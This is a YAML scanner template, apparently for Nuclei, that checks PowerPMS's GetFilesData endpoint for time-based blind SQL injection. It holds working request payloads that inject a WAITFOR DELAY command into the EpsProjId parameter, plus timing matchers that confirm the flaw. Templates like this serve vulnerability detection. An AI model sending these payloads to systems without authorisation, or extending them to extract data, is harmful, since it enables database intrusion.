id: poc-yaml-powerpms-getfilesdata-sqli
info:
  name: "PowerPMS GetFilesData 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: PowerPMS

http:
  - raw:
      - |
        POST /UploadFle/GetFilesData?EpsProjId=1';WAITFOR+DELAY+'0:0:5'--&StartDate=2&EndDate=2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

      - |
        POST /UploadFle/GetFilesData?EpsProjId=1';WAITFOR+DELAY+'0:0:8'--&StartDate=2&EndDate=2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"success\":true"
          - "\"message\":\"\""
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
